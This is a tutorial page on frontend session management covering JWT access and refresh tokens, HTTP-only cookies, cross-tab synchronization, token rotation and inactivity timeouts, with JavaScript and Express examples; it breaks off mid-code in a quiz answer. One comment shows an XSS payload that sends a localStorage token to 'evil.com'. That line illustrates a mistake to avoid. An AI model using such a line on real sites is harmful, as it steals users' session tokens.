---
title: Session
layout: doc
slug: session
---

# Session

## Key Insight

Session management in frontend applications balances stateless authentication (JWT tokens for API authorization) with stateful user experience (persisting preferences, cart data, form progress across page reloads and browser sessions) through layered storage strategies—HTTP-only cookies for security-critical auth tokens preventing XSS theft, localStorage for persistent user preferences surviving browser restarts, sessionStorage for temporary tab-specific state, and server-side sessions for sensitive data requiring server validation—while implementing token rotation, silent refresh, and cross-tab synchronization to maintain seamless authentication across multiple windows without re-login prompts or data loss.

## Detailed Description

Session management addresses the fundamental challenge of maintaining user state in stateless HTTP environments: web applications need to remember who you are (authentication), what you're doing (application state), and your preferences (personalization) across requests, page reloads, and browser sessions, while balancing security (preventing token theft, XSS, CSRF attacks), performance (minimizing server roundtrips), and user experience (no unexpected logouts, data persistence, cross-tab consistency). Traditional server-rendered apps store everything server-side with session cookies, but modern SPAs distribute state across client storage (localStorage, sessionStorage, cookies) and server sessions, requiring careful orchestration.

The three-layer session architecture separates concerns: (1) **Application Session** (client-side state managing UI preferences, shopping cart, form drafts, navigation history using localStorage/sessionStorage/IndexedDB, survives page reloads, may persist across browser sessions), (2) **Authentication Session** (auth provider like Auth0/Okta tracking logged-in user with refresh tokens in HTTP-only cookies, access tokens short-lived 15min in memory, refresh tokens long-lived 30 days rotating on use, silent authentication via hidden iframe refreshing tokens before expiration), (3) **Identity Provider Session** (Google/Facebook/Microsoft SSO remembering user login, enables single sign-on across multiple apps, controlled by IdP not your application, logout requires IdP logout endpoint). These layers interact—IdP session enables Auth session creation, Auth session gates Application session access—but expire independently causing logout confusion ("I was just logged into Gmail, why did your app log me out?").

Token-based authentication using JWTs replaces session IDs: **Access Tokens** (short-lived 15-60min, included in Authorization header for API requests, contains user claims encoded in JWT payload, stateless server validation via signature checking no database lookup, expires quickly limiting damage if stolen), **Refresh Tokens** (long-lived 30-90 days, stored in HTTP-only cookies preventing JavaScript access, used exclusively to obtain new access tokens via `/oauth/token` endpoint, rotates on each use invalidating old token, server tracks in database enabling revocation). Access tokens stay in memory (JavaScript variable, React state) never localStorage avoiding XSS theft—if attacker injects script they can't read HTTP-only refresh token cookie. Silent authentication refreshes access tokens before expiration using hidden iframe calling `/authorize` with `prompt=none` parameter, seamlessly maintaining session without user interruption.

Storage strategies balance security vs persistence vs scope: **Cookies** (HTTP-only secure SameSite cookies for refresh tokens, 4KB limit, sent automatically with requests, vulnerable to CSRF requiring CSRF tokens, scoped to domain/path, accessible across tabs, survive browser restart if persistent), **localStorage** (5-10MB limit, persists across browser restarts, accessible from all tabs same origin, synchronizes via storage event listener, vulnerable to XSS attacks avoid storing tokens, ideal for user preferences theme/language, cart data, draft content), **sessionStorage** (5-10MB limit, scoped to single tab, clears on tab close, isolated between tabs, ideal for wizard progress, temporary filters, tab-specific state), **IndexedDB** (50MB+ limit, asynchronous key-value store, structured data with indexes, ideal for offline data caching, large datasets, transaction support). Never store sensitive tokens in localStorage—if XSS attacker injects `<script>` they can read localStorage but not HTTP-only cookies.

Cross-tab synchronization keeps multiple windows consistent: BroadcastChannel API sends messages to all tabs (logout in one tab logs out all tabs, cart update reflects everywhere, permission changes propagate), localStorage storage event fires when other tabs modify localStorage (listen for token changes indicating logout/login), SharedWorker maintains single background process coordinating tabs (centralized token refresh avoiding race conditions, single WebSocket connection shared across tabs), ServiceWorker intercepts all fetch requests applying consistent authentication (inject access token into API requests, refresh token if expired, logout all tabs on 401). Without synchronization, user logs out in Tab A but Tab B remains "logged in" with expired token causing confusing 401 errors.

Token rotation prevents replay attacks: each refresh token use returns new access token + new refresh token invalidating old refresh token (refresh token A → access token B + refresh token C, using refresh token A again fails), server tracks refresh token family (issued_token → used_by_token → used_by_token forming chain), detects reuse (old refresh token used indicates potential theft), revokes entire family (logout all sessions for that user across all devices), rotating refresh tokens limits damage window (stolen token only valid until next rotation ~15min). Implementation requires database storage tracking (token_id, user_id, family_id, created_at, expires_at, revoked_at), refresh endpoint validates token family, atomic token rotation preventing race conditions.

Silent authentication maintains sessions transparently: access token expires in 15min, application checks expiration before API calls, triggers refresh 5min before expiry, creates hidden iframe calling `/authorize` with `prompt=none` (skips login UI if Auth session valid), receives new tokens via postMessage, updates access token in memory, continues API request seamlessly. User never sees login prompt as long as Auth session (refresh token) valid. Fallback to full login if Auth session expired (refresh token invalid), redirect to `/login` with `return_url` preserving navigation intent, after login redirect back to original page, restore application state from sessionStorage.

Session timeout strategies balance security vs UX: **Absolute timeout** (30-day maximum regardless of activity, refresh token expires forcing re-login, prevents indefinite sessions), **Sliding timeout** (extends session on activity, "remember me" checkbox enables longer absolute timeout 90 days vs 30 days, last_activity timestamp updates on API calls, logout if inactive >30min), **Hybrid approach** (sliding timeout up to absolute maximum, activity extends up to 2 hours, absolute maximum 30 days, balances convenience and security). Implement activity tracking (mouse/keyboard listeners update last_activity localStorage, before API call check Date.now() - last_activity > 30min, if inactive too long logout locally, server validates timestamp preventing client manipulation).

Cross-domain session management for multi-domain SPAs (app.example.com, shop.example.com, blog.example.com sharing authentication): **Push approach** (main domain maintains WebSocket connection to auth server, other domains embed iframe from main domain, iframe postMessage sends tokens to parent window, all domains stay synchronized), **Poll approach** (each domain polls auth server every 5min checking session validity, /session/status endpoint returns logged-in state, creates new session if IdP session valid, race condition window between domains), **Subdomain cookie sharing** (set refresh token cookie with domain=.example.com, accessible across all subdomains, requires all subdomains on same root domain, doesn't work for completely different domains app.com and shop.net). Third-party cookie deprecation (Safari ITP, Chrome Privacy Sandbox) breaks iframe approach—fallback to server-side session tracking with client polling.

## Code Examples

### Basic Example: Token-Based Authentication with Refresh

Simple JWT authentication with automatic token refresh:

```javascript
// ===== auth.js =====
// Authentication service managing tokens

class AuthService {
  constructor() {
    this.accessToken = null;
    this.refreshTokenTimeout = null;
  }
  
  // Login with credentials
  async login(email, password) {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include', // Send cookies
      body: JSON.stringify({ email, password })
    });
    
    if (!response.ok) {
      throw new Error('Login failed');
    }
    
    const { accessToken, expiresIn } = await response.json();
    
    // Store access token in memory (NOT localStorage)
    this.accessToken = accessToken;
    
    // Refresh token stored in HTTP-only cookie (set by server)
    // Schedule refresh before expiration
    this.scheduleTokenRefresh(expiresIn);
    
    return accessToken;
  }
  
  // Refresh access token using refresh token cookie
  async refreshAccessToken() {
    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include' // Send refresh token cookie
      });
      
      if (!response.ok) {
        throw new Error('Refresh failed');
      }
      
      const { accessToken, expiresIn } = await response.json();
      this.accessToken = accessToken;
      this.scheduleTokenRefresh(expiresIn);
      
      return accessToken;
    } catch (error) {
      // Refresh failed - logout user
      this.logout();
      throw error;
    }
  }
  
  // Schedule token refresh 5 minutes before expiration
  scheduleTokenRefresh(expiresIn) {
    // Clear existing timeout
    if (this.refreshTokenTimeout) {
      clearTimeout(this.refreshTokenTimeout);
    }
    
    // Refresh 5 minutes (300s) before expiration
    const refreshTime = (expiresIn - 300) * 1000;
    
    this.refreshTokenTimeout = setTimeout(() => {
      this.refreshAccessToken();
    }, refreshTime);
  }
  
  // Logout (clear tokens)
  async logout() {
    // Clear access token from memory
    this.accessToken = null;
    
    // Clear refresh timeout
    if (this.refreshTokenTimeout) {
      clearTimeout(this.refreshTokenTimeout);
    }
    
    // Call logout endpoint to clear refresh token cookie
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include'
    });
  }
  
  // Get current access token (refresh if needed)
  async getAccessToken() {
    if (!this.accessToken) {
      // No token - try to refresh from cookie
      try {
        await this.refreshAccessToken();
      } catch {
        return null;
      }
    }
    
    return this.accessToken;
  }
  
  // Check if user is authenticated
  isAuthenticated() {
    return this.accessToken !== null;
  }
}

export const authService = new AuthService();


// ===== api.js =====
// API client with automatic token injection

async function apiCall(url, options = {}) {
  // Get access token
  const token = await authService.getAccessToken();
  
  if (!token) {
    throw new Error('Not authenticated');
  }
  
  // Inject Authorization header
  const headers = {
    ...options.headers,
    'Authorization': `Bearer ${token}`
  };
  
  const response = await fetch(url, {
    ...options,
    headers
  });
  
  // Handle 401 Unauthorized - token expired
  if (response.status === 401) {
    try {
      // Try to refresh token
      await authService.refreshAccessToken();
      
      // Retry request with new token
      const newToken = await authService.getAccessToken();
      headers.Authorization = `Bearer ${newToken}`;
      
      return fetch(url, { ...options, headers });
    } catch {
      // Refresh failed - logout
      authService.logout();
      window.location.href = '/login';
    }
  }
  
  return response;
}


// ===== Server (Node.js/Express) =====
const express = require('express');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());
app.use(express.json());

const ACCESS_TOKEN_SECRET = 'your-access-token-secret';
const REFRESH_TOKEN_SECRET = 'your-refresh-token-secret';

// In-memory refresh token store (use Redis in production)
const refreshTokens = new Set();

// Login endpoint
app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  
  // Validate credentials (simplified)
  if (email === 'user@example.com' && password === 'password') {
    const user = { id: 1, email };
    
    // Generate access token (15 minutes)
    const accessToken = jwt.sign(user, ACCESS_TOKEN_SECRET, {
      expiresIn: '15m'
    });
    
    // Generate refresh token (30 days)
    const refreshToken = jwt.sign(user, REFRESH_TOKEN_SECRET, {
      expiresIn: '30d'
    });
    
    // Store refresh token
    refreshTokens.add(refreshToken);
    
    // Set refresh token as HTTP-only cookie
    res.cookie('refreshToken', refreshToken, {
      httpOnly: true,  // Prevents JavaScript access (XSS protection)
      secure: true,    // HTTPS only
      sameSite: 'strict', // CSRF protection
      maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
    });
    
    // Send access token in response
    res.json({
      accessToken,
      expiresIn: 900 // 15 minutes in seconds
    });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Refresh endpoint
app.post('/api/auth/refresh', (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  if (!refreshToken || !refreshTokens.has(refreshToken)) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
  
  jwt.verify(refreshToken, REFRESH_TOKEN_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: 'Token expired' });
    }
    
    // Generate new access token
    const accessToken = jwt.sign(
      { id: user.id, email: user.email },
      ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );
    
    res.json({
      accessToken,
      expiresIn: 900
    });
  });
});

// Logout endpoint
app.post('/api/auth/logout', (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  
  // Remove refresh token from store
  refreshTokens.delete(refreshToken);
  
  // Clear cookie
  res.clearCookie('refreshToken');
  res.json({ message: 'Logged out' });
});
```

### Practical Example: Cross-Tab Session Synchronization

Keep authentication state synchronized across browser tabs:

```javascript
// ===== sessionSync.js =====
// Cross-tab session synchronization

class SessionSync {
  constructor() {
    this.channel = new BroadcastChannel('auth-channel');
    this.setupListeners();
  }
  
  setupListeners() {
    // Listen for messages from other tabs
    this.channel.addEventListener('message', (event) => {
      const { type, data } = event.data;
      
      switch (type) {
        case 'LOGIN':
          this.handleRemoteLogin(data);
          break;
        case 'LOGOUT':
          this.handleRemoteLogout();
          break;
        case 'TOKEN_REFRESH':
          this.handleRemoteTokenRefresh(data);
          break;
      }
    });
    
    // Also listen for localStorage changes (fallback for older browsers)
    window.addEventListener('storage', (event) => {
      if (event.key === 'logout-event') {
        this.handleRemoteLogout();
      }
    });
  }
  
  // Broadcast login to other tabs
  broadcastLogin(accessToken) {
    this.channel.postMessage({
      type: 'LOGIN',
      data: { accessToken }
    });
  }
  
  // Broadcast logout to other tabs
  broadcastLogout() {
    // BroadcastChannel
    this.channel.postMessage({ type: 'LOGOUT' });
    
    // localStorage fallback (triggers storage event in other tabs)
    localStorage.setItem('logout-event', Date.now().toString());
    localStorage.removeItem('logout-event');
  }
  
  // Broadcast token refresh to other tabs
  broadcastTokenRefresh(accessToken) {
    this.channel.postMessage({
      type: 'TOKEN_REFRESH',
      data: { accessToken }
    });
  }
  
  handleRemoteLogin(data) {
    authService.accessToken = data.accessToken;
    window.dispatchEvent(new CustomEvent('auth-state-changed', {
      detail: { authenticated: true }
    }));
  }
  
  handleRemoteLogout() {
    authService.accessToken = null;
    window.location.href = '/login';
  }
  
  handleRemoteTokenRefresh(data) {
    authService.accessToken = data.accessToken;
  }
}

export const sessionSync = new SessionSync();


// ===== Enhanced AuthService with cross-tab sync =====
class AuthService {
  async login(email, password) {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ email, password })
    });
    
    const { accessToken, expiresIn } = await response.json();
    this.accessToken = accessToken;
    this.scheduleTokenRefresh(expiresIn);
    
    // Broadcast login to other tabs
    sessionSync.broadcastLogin(accessToken);
    
    return accessToken;
  }
  
  async logout() {
    this.accessToken = null;
    
    if (this.refreshTokenTimeout) {
      clearTimeout(this.refreshTokenTimeout);
    }
    
    // Broadcast logout to other tabs BEFORE server call
    sessionSync.broadcastLogout();
    
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include'
    });
  }
  
  async refreshAccessToken() {
    const response = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include'
    });
    
    const { accessToken, expiresIn } = await response.json();
    this.accessToken = accessToken;
    this.scheduleTokenRefresh(expiresIn);
    
    // Broadcast token refresh to other tabs
    sessionSync.broadcastTokenRefresh(accessToken);
    
    return accessToken;
  }
}


// ===== SharedWorker approach (alternative) =====
// Centralizes token refresh across all tabs

// shared-worker.js
let accessToken = null;
let refreshTimeout = null;
const connections = [];

self.addEventListener('connect', (event) => {
  const port = event.ports[0];
  connections.push(port);
  
  port.addEventListener('message', async (e) => {
    const { type, data } = e.data;
    
    switch (type) {
      case 'LOGIN':
        accessToken = data.accessToken;
        scheduleRefresh(data.expiresIn);
        broadcastToAll({ type: 'TOKEN_UPDATED', accessToken });
        break;
        
      case 'LOGOUT':
        accessToken = null;
        clearTimeout(refreshTimeout);
        broadcastToAll({ type: 'LOGGED_OUT' });
        break;
        
      case 'GET_TOKEN':
        port.postMessage({ type: 'TOKEN', accessToken });
        break;
    }
  });
  
  port.start();
  
  // Send current token to new connection
  if (accessToken) {
    port.postMessage({ type: 'TOKEN', accessToken });
  }
});

function broadcastToAll(message) {
  connections.forEach(port => port.postMessage(message));
}

async function scheduleRefresh(expiresIn) {
  clearTimeout(refreshTimeout);
  
  refreshTimeout = setTimeout(async () => {
    // Refresh token
    const response = await fetch('/api/auth/refresh', {
      credentials: 'include'
    });
    const { accessToken: newToken, expiresIn } = await response.json();
    
    accessToken = newToken;
    scheduleRefresh(expiresIn);
    broadcastToAll({ type: 'TOKEN_UPDATED', accessToken: newToken });
  }, (expiresIn - 300) * 1000);
}


// Main app using SharedWorker
const worker = new SharedWorker('shared-worker.js');

worker.port.addEventListener('message', (event) => {
  const { type, accessToken } = event.data;
  
  if (type === 'TOKEN_UPDATED') {
    authService.accessToken = accessToken;
  } else if (type === 'LOGGED_OUT') {
    window.location.href = '/login';
  }
});

worker.port.start();
```

### Advanced Example: Session Persistence with Activity Tracking

Implement sliding timeout with activity tracking and state persistence:

```javascript
// ===== sessionManager.js =====
// Advanced session management with activity tracking

class SessionManager {
  constructor() {
    this.ACTIVITY_TIMEOUT = 30 * 60 * 1000; // 30 minutes
    this.ABSOLUTE_TIMEOUT = 30 * 24 * 60 * 60 * 1000; // 30 days
    
    this.lastActivity = Date.now();
    this.sessionStart = Date.now();
    
    this.setupActivityTracking();
    this.setupSessionChecks();
    this.restoreSession();
  }
  
  setupActivityTracking() {
    // Track user activity
    const activityEvents = ['mousedown', 'keydown', 'scroll', 'touchstart'];
    
    const updateActivity = () => {
      this.lastActivity = Date.now();
      this.persistActivity();
    };
    
    // Throttle activity updates (max once per minute)
    let throttleTimeout = null;
    const throttledUpdate = () => {
      if (!throttleTimeout) {
        updateActivity();
        throttleTimeout = setTimeout(() => {
          throttleTimeout = null;
        }, 60000);
      }
    };
    
    activityEvents.forEach(event => {
      window.addEventListener(event, throttledUpdate, { passive: true });
    });
  }
  
  setupSessionChecks() {
    // Check session validity every minute
    setInterval(() => {
      this.checkSessionValidity();
    }, 60000);
    
    // Check when tab becomes visible (user returns)
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        this.checkSessionValidity();
      }
    });
  }
  
  checkSessionValidity() {
    const now = Date.now();
    const inactiveDuration = now - this.lastActivity;
    const sessionDuration = now - this.sessionStart;
    
    // Check activity timeout (sliding)
    if (inactiveDuration > this.ACTIVITY_TIMEOUT) {
      this.handleTimeout('Activity timeout - logged out due to inactivity');
      return;
    }
    
    // Check absolute timeout
    if (sessionDuration > this.ABSOLUTE_TIMEOUT) {
      this.handleTimeout('Session expired - please login again');
      return;
    }
    
    // Warn user if approaching timeout (5 minutes remaining)
    const timeUntilTimeout = this.ACTIVITY_TIMEOUT - inactiveDuration;
    if (timeUntilTimeout < 5 * 60 * 1000 && timeUntilTimeout > 4 * 60 * 1000) {
      this.showTimeoutWarning(timeUntilTimeout);
    }
  }
  
  handleTimeout(message) {
    // Clear session
    authService.logout();
    this.clearPersistedSession();
    
    // Redirect to login with message
    const returnUrl = encodeURIComponent(window.location.pathname);
    window.location.href = `/login?message=${encodeURIComponent(message)}&return=${returnUrl}`;
  }
  
  showTimeoutWarning(remainingTime) {
    const minutes = Math.floor(remainingTime / 60000);
    
    // Show notification/modal
    console.warn(`Session will expire in ${minutes} minutes`);
    
    // Could trigger UI notification
    window.dispatchEvent(new CustomEvent('session-timeout-warning', {
      detail: { remainingTime }
    }));
  }
  
  // Persist activity timestamp
  persistActivity() {
    localStorage.setItem('session_last_activity', this.lastActivity.toString());
  }
  
  // Restore session on page load
  restoreSession() {
    const savedActivity = localStorage.getItem('session_last_activity');
    const savedStart = localStorage.getItem('session_start');
    
    if (savedActivity) {
      this.lastActivity = parseInt(savedActivity);
    }
    
    if (savedStart) {
      this.sessionStart = parseInt(savedStart);
    } else {
      this.sessionStart = Date.now();
      localStorage.setItem('session_start', this.sessionStart.toString());
    }
    
    // Check if session is still valid
    this.checkSessionValidity();
  }
  
  clearPersistedSession() {
    localStorage.removeItem('session_last_activity');
    localStorage.removeItem('session_start');
  }
  
  // Extend session (called after successful re-authentication)
  extendSession() {
    this.sessionStart = Date.now();
    this.lastActivity = Date.now();
    localStorage.setItem('session_start', this.sessionStart.toString());
    this.persistActivity();
  }
}

export const sessionManager = new SessionManager();


// ===== Application state persistence =====
// Persist user state across sessions

class StatePersistence {
  constructor() {
    this.STORAGE_KEY = 'app_state';
  }
  
  // Save application state
  saveState(state) {
    try {
      const serialized = JSON.stringify({
        ...state,
        timestamp: Date.now()
      });
      localStorage.setItem(this.STORAGE_KEY, serialized);
    } catch (error) {
      console.error('Failed to save state:', error);
    }
  }
  
  // Restore application state
  restoreState() {
    try {
      const serialized = localStorage.getItem(this.STORAGE_KEY);
      
      if (!serialized) {
        return null;
      }
      
      const state = JSON.parse(serialized);
      const age = Date.now() - state.timestamp;
      
      // Ignore state older than 7 days
      if (age > 7 * 24 * 60 * 60 * 1000) {
        this.clearState();
        return null;
      }
      
      return state;
    } catch (error) {
      console.error('Failed to restore state:', error);
      return null;
    }
  }
  
  // Clear persisted state
  clearState() {
    localStorage.removeItem(this.STORAGE_KEY);
  }
  
  // Auto-save state on changes (debounced)
  setupAutoSave(getStateFunction, debounceMs = 1000) {
    let saveTimeout = null;
    
    const debouncedSave = () => {
      clearTimeout(saveTimeout);
      saveTimeout = setTimeout(() => {
        const state = getStateFunction();
        this.saveState(state);
      }, debounceMs);
    };
    
    // Save before page unload
    window.addEventListener('beforeunload', () => {
      const state = getStateFunction();
      this.saveState(state);
    });
    
    return debouncedSave;
  }
}

export const statePersistence = new StatePersistence();


// ===== Usage example =====
// React app with session and state persistence

import { useEffect, useState } from 'react';

function App() {
  const [userPreferences, setUserPreferences] = useState({
    theme: 'light',
    language: 'en',
    notifications: true
  });
  
  useEffect(() => {
    // Restore state on mount
    const restored = statePersistence.restoreState();
    if (restored?.userPreferences) {
      setUserPreferences(restored.userPreferences);
    }
    
    // Setup auto-save
    const saveState = statePersistence.setupAutoSave(() => ({
      userPreferences
    }));
    
    // Save on preference changes
    return () => saveState();
  }, [userPreferences]);
  
  // Listen for timeout warnings
  useEffect(() => {
    const handleWarning = (event) => {
      const minutes = Math.floor(event.detail.remainingTime / 60000);
      alert(`Your session will expire in ${minutes} minutes. Click to stay logged in.`);
      
      // Update activity to extend session
      sessionManager.lastActivity = Date.now();
      sessionManager.persistActivity();
    };
    
    window.addEventListener('session-timeout-warning', handleWarning);
    return () => window.removeEventListener('session-timeout-warning', handleWarning);
  }, []);
  
  return (
    <div className={`app theme-${userPreferences.theme}`}>
      {/* App content */}
    </div>
  );
}
```

## Common Mistakes

### 1. Storing Tokens in localStorage
**Mistake:** Saving access/refresh tokens in localStorage exposes them to XSS attacks.

```javascript
// ❌ BAD: Token in localStorage vulnerable to XSS
localStorage.setItem('accessToken', token);
localStorage.setItem('refreshToken', refreshToken);

// Attacker injects: <script>
//   fetch('https://evil.com/steal?token=' + localStorage.getItem('accessToken'))
// </script>
```

```javascript
// ✅ GOOD: Tokens in memory + HTTP-only cookies
class AuthService {
  constructor() {
    this.accessToken = null; // Memory only
    // Refresh token in HTTP-only cookie (set by server)
  }
  
  async login(email, password) {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      credentials: 'include', // Send/receive cookies
      body: JSON.stringify({ email, password })
    });
    
    const { accessToken } = await response.json();
    this.accessToken = accessToken; // Memory only
    
    // Server sets: 
    // res.cookie('refreshToken', token, { httpOnly: true, secure: true })
  }
}
```

**Why it matters:** XSS attacks can read localStorage but not HTTP-only cookies. Access token in memory cleared on page refresh (refresh from cookie).

### 2. Not Handling Token Refresh Race Conditions
**Mistake:** Multiple simultaneous API calls trigger multiple refresh requests.

```javascript
// ❌ BAD: Race condition - multiple refresh calls
async function apiCall(url) {
  const token = await getAccessToken();
  
  const response = await fetch(url, {
    headers: { Authorization: `Bearer ${token}` }
  });
  
  if (response.status === 401) {
    await refreshAccessToken(); // Multiple calls trigger multiple refreshes!
    return apiCall(url); // Retry
  }
  
  return response;
}

// If 5 API calls happen simultaneously, all get 401, all trigger refresh
```

```javascript
// ✅ GOOD: Single refresh with promise caching
class AuthService {
  constructor() {
    this.accessToken = null;
    this.refreshPromise = null; // Cache refresh promise
  }
  
  async refreshAccessToken() {
    // Return existing refresh promise if already refreshing
    if (this.refreshPromise) {
      return this.refreshPromise;
    }
    
    this.refreshPromise = fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include'
    })
      .then(r => r.json())
      .then(data => {
        this.accessToken = data.accessToken;
        this.refreshPromise = null; // Clear promise
        return data.accessToken;
      })
      .catch(error => {
        this.refreshPromise = null;
        throw error;
      });
    
    return this.refreshPromise;
  }
}

// Now multiple simultaneous 401s share single refresh request
```

**Why it matters:** Multiple refresh requests can cause token rotation issues and server rate limiting.

### 3. Not Synchronizing Logout Across Tabs
**Mistake:** User logs out in one tab but remains logged in on others.

```javascript
// ❌ BAD: Logout only affects current tab
async function logout() {
  authService.accessToken = null;
  await fetch('/api/auth/logout', { credentials: 'include' });
  window.location.href = '/login';
}

// Other tabs still have accessToken in memory, causing confusing 401 errors
```

```javascript
// ✅ GOOD: Broadcast logout to all tabs
class SessionSync {
  constructor() {
    this.channel = new BroadcastChannel('auth-channel');
    this.setupListeners();
  }
  
  setupListeners() {
    this.channel.addEventListener('message', (event) => {
      if (event.data.type === 'LOGOUT') {
        // Another tab logged out - logout this tab too
        authService.accessToken = null;
        window.location.href = '/login';
      }
    });
    
    // Fallback for browsers without BroadcastChannel
    window.addEventListener('storage', (event) => {
      if (event.key === 'logout-event') {
        authService.accessToken = null;
        window.location.href = '/login';
      }
    });
  }
  
  broadcastLogout() {
    // Broadcast to other tabs
    this.channel.postMessage({ type: 'LOGOUT' });
    
    // localStorage fallback (triggers storage event in other tabs)
    localStorage.setItem('logout-event', Date.now().toString());
    localStorage.removeItem('logout-event');
  }
}

async function logout() {
  sessionSync.broadcastLogout(); // Notify all tabs
  authService.accessToken = null;
  await fetch('/api/auth/logout', { credentials: 'include' });
  window.location.href = '/login';
}
```

**Why it matters:** Inconsistent authentication state across tabs confuses users and causes unexpected 401 errors.

## Quick Quiz

<details>
<summary><strong>Question 1:</strong> What's the difference between access tokens and refresh tokens?</summary>

**Answer:**

**Access Tokens:**
- **Lifespan:** Short (15-60 minutes)
- **Storage:** Memory (JavaScript variable, React state)
- **Purpose:** Authorize API requests
- **Usage:** Every API call
- **Security:** Exposed to client code
- **Format:** JWT with user claims
- **Revocation:** Cannot be revoked (expires naturally)

```javascript
// Included in API requests
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${accessToken}`
  }
});
```

**Refresh Tokens:**
- **Lifespan:** Long (30-90 days)
- **Storage:** HTTP-only secure cookie
- **Purpose:** Obtain new access tokens
- **Usage:** Only when access token expires
- **Security:** Protected from JavaScript
- **Format:** Random string or JWT
- **Revocation:** Stored server-side, can be revoked

```javascript
// Server sets as cookie
res.cookie('refreshToken', token, {
  httpOnly: true,  // JavaScript cannot read
  secure: true,    // HTTPS only
  sameSite: 'strict',
  maxAge: 30 * 24 * 60 * 60 * 1000
});
```

**Why separate?**
- Access token short-lived = limited damage if stolen
- Refresh token HTTP-only = XSS can't steal
- Access token in API calls = stateless, fast validation
- Refresh token rarely used = easier to track/revoke

**Flow:**
1. Login → Get access token + refresh token (cookie)
2. API calls → Use access token
3. Access token expires (15min) → Use refresh token to get new access token
4. Refresh token rotates → New refresh token issued
5. Eventually refresh token expires (30d) → Full re-login required
</details>

<details>
<summary><strong>Question 2:</strong> How does token rotation prevent replay attacks?</summary>

**Answer:**

**Token Rotation Mechanism:**

Each time refresh token is used, it's invalidated and replaced:

```javascript
// Server refresh endpoint
app.post('/api/auth/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;
  
  // 1. Validate old refresh token
  const session = await db.findSession({ refreshToken: oldRefreshToken });
  
  if (!session) {
    return res.status(401).json({ error: 'Invalid token' });
  }
  
  // 2. Check if token already used (replay detection)
  if (session.used) {
    // Token reuse detected - possible theft!
    await db.revokeSessionFamily(session.familyId);
    return res.status(401).json({ error: 'Token reused' });
  }
  
  // 3. Mark old token as used
  await db.updateSession(oldRefreshToken, { used: true });
  
  // 4. Generate new tokens
  const newAccessToken = generateAccessToken(session.userId);
  const newRefreshToken = generateRefreshToken();
  
  // 5. Store new refresh token (same family)
  await db.createSession({
    refreshToken: newRefreshToken,
    userId: session.userId,
    familyId: session.familyId,
    parentToken: oldRefreshToken,
    used: false
  });
  
  // 6. Set new refresh token cookie
  res.cookie('refreshToken', newRefreshToken, {
    httpOnly: true,
    secure: true,
    maxAge: 30 * 24 * 60 * 60 * 1000
  });
  
  res.json({ accessToken: newAccessToken });
});
```

**Token Family Tree:**
```
Initial Login
└─ Refresh Token A
   └─ Used to get Refresh Token B
      └─ Used to get Refresh Token C (current)
         └─ Used to get Refresh Token D
```

**Replay Attack Detection:**

**Scenario:** Attacker steals Refresh Token B

1. User has Token C (legitimate, current)
2. Attacker uses Token B (old, already used)
3. Server detects Token B was already used → **Revokes entire family**
4. Both Token C (user) and Token B (attacker) now invalid
5. User gets logged out, must re-authenticate

**Why it works:**
- ✅ Legitimate user always has latest token (never uses old ones)
- ❌ Attacker only has old stolen token
- 🚨 Using old token triggers security alert
- 🔒 Revoke entire family = logout everywhere

**Benefits:**
- Limits damage window (token valid until next rotation ~15min)
- Detects theft quickly (immediate alert on reuse)
- Forces re-authentication (secure recovery)

**Implementation requirements:**
- Database tracks token family relationships
- Atomic token rotation (prevent race conditions)
- Session revocation mechanism
</details>

<details>
<summary><strong>Question 3:</strong> How do you implement cross-tab session synchronization?</summary>

**Answer:**

**Three approaches for syncing authentication across browser tabs:**

---

**1. BroadcastChannel API** (Modern browsers)

```javascript
// Create broadcast channel
const authChannel = new BroadcastChannel('auth-channel');

// Send messages to other tabs
function broadcastLogin(accessToken) {
  authChannel.postMessage({
    type: 'LOGIN',
    accessToken
  });
}

function broadcastLogout() {
  authChannel.postMessage({ type: 'LOGOUT' });
}

// Receive messages from other tabs
authChannel.addEventListener('message', (event) => {
  const { type, accessToken } = event.data;
  
  if (type === 'LOGIN') {
    authService.accessToken = accessToken;
    updateUI({ authenticated: true });
  } else if (type === 'LOGOUT') {
    authService.accessToken = null;
    window.location.href = '/login';
  }
});
```

**Pros:** Simple, efficient, real-time  
**Cons:** Not supported in older browsers

---

**2. localStorage + storage event** (Fallback)

```javascript
// Tab A: Trigger logout
function logout() {
  authService.accessToken = null;
  
  // Trigger storage event in other tabs
  localStorage.setItem('logout-event', Date.now().toString());
  localStorage.removeItem('logout-event'); // Clean up
  
  window.location.href = '/login';
}

// Tab B: Listen for storage events
window.addEventListener('storage', (event) => {
  // Only fires in OTHER tabs (not current tab)
  if (event.key === 'logout-event') {
    authService.accessToken = null;
    window.location.href = '/login';
  }
  
  if (event.key === 'login-event') {
    const data = JSON.parse(event.newValue);
    authService.accessToken = data.accessToken;
    updateUI({ authenticated: true });
  }
});
```

**Pros:** Works in all browsers  
**Cons:** Only detects changes, not same-tab updates

---

**3. SharedWorker** (Advanced)

Centralized worker manages tokens for all tabs:

```javascript
// shared-worker.js
let accessToken = null;
const ports = [];

self.addEventListener('connect', (event) => {
  const port = event.ports[0];
  ports.push(port);
  
  port.addEventListener('message', (e) => {
    if (e.data.type === 'LOGIN') {
      accessToken = e.data.accessToken;
      
      // Notify all tabs
      ports.forEach(p => p.postMessage({
        type: 'TOKEN_UPDATED',
        accessToken
      }));
    }
    
    if (e.data.type === 'GET_TOKEN') {
